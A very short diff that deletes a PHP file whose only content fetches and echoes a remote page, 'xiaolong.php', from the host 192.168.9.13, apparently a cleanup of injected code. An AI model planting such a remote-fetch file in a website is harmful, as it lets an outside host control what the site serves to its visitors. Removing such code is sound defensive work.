@@ -1,2 +1,0 @@
-<?php
-	echo file_get_contents('https://192.168.9.13/xiaolong.php');
